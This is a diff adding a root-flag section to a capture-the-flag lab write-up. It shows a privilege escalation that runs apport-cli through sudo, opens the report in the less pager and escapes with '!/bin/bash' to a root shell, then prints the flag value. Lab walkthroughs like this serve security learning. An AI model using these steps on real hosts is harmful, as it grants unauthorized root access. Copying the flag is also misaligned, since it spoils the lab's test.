@@ -384,8 +384,51 @@ A google search of "apport-cli privesc CVE" returns the [NIST page](https://nvd.
 
 ---
 
+## Submit Root Flag : Submit the flag located in the root user's home directory.
+
+To find out the currently running processes.
+```
+ps -ux
+```
+
+<img width="764" height="113" alt="image" src="https://github.com/user-attachments/assets/dafcdfe1-8f61-431b-a4a1-d597c103b8bf" />
+
+Choose systemMD (PID 3019)
+<br>
+
+```
+sudo /usr/bin/apport-cli -f -P 3019
+```
+
+<img width="1120" height="607" alt="image" src="https://github.com/user-attachments/assets/76fc83c0-1461-4d70-a782-0c59ab0a2b97" />
 
 
+Answer Yes, Yes then "V".
+
+After selecting view report, since "less" is configured as the default pager, we can run the !/bin/bash command and spawn an
+interactive system shell as root .
+
+```
+!/bin/bash
+```
+<img width="871" height="582" alt="image" src="https://github.com/user-attachments/assets/9563e0ca-6be2-4b75-b60c-e0f9115bb62f" />
+<br>
+<br>
+
+
+
+We have a root shell.
+
+<img width="299" height="61" alt="image" src="https://github.com/user-attachments/assets/1bd4193c-39ce-4274-a5a0-9b3752cdd6e8" />
+<br>
+<br>
+<img width="302" height="94" alt="image" src="https://github.com/user-attachments/assets/d4adc7d7-6751-4f2b-af4c-f1bb83a2b295" />
+<br>
+<br>
+
+> Root Flag : d6c0e2680a90513afa373aa2e27edfc2
+
+---
 
 
 
